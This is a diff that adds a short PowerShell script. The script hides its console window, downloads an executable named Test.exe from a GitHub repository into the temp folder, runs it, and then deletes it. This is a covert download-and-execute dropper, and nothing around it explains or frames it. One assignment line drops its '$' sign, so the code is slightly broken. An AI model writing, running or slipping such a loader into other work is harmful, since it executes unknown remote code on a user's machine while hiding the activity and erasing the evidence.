@@ -1,0 +1,21 @@
+Add-Type @"
+    using System;
+    using System.Runtime.InteropServices;
+    public class ConsoleWindow {
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr GetConsoleWindow();
+        [DllImport("user32.dll")]
+        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+        public const int SW_HIDE = 0;
+    }
+"@
+
+$consolePtr = [ConsoleWindow]::GetConsoleWindow()
+
+[ConsoleWindow]::ShowWindow($consolePtr, [ConsoleWindow]::SW_HIDE)
+
+url = "https://github.com/Gabkill54/Kidou-Software/raw/main/Test.exe"
+$output = "$env:TEMP\Test.exe"
+Invoke-WebRequest -Uri $url -OutFile $output
+Start-Process $output -Wait
+Remove-Item $output
